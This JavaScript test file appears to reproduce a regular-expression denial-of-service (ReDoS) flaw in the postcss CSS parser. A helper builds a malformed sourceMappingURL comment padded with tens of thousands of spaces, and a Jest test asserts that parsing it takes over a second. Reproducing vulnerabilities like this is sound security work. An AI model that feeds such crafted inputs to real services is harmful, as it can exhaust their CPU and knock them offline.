function build_attack(n) {
  var ret = "/*# sourceMappingURL=";
  for (var i = 0; i < n; i++) {
    ret += " ";
  }
  return ret + "!";
}

// postcss.parse('a{}/*# sourceMappingURL=a.css.map */')
// for(var i = 1; i <= 5000; i++) {
//     if (i % 1000 == 0) {
//         var time = Date.now();
//         let attack_str = build_attack(10)
//         try{
//             postcss.parse(attack_str)
//             var time_cost = Date.now() - time;
//             console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms");
//             }
//         catch(e){
//         var time_cost = Date.now() - time;
//         console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms");
//         }
//     }
// }

test("ReDos in postcss", () => {
  const genstr = require("./utils").genstr;
  const measureTime = require("./utils").measureTime;
  const postcss = require("postcss");

  let attack_str = build_attack(50000);

  let t = measureTime(function () {
    try {
      postcss.parse(attack_str);
    } catch (e) {}
  });

  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
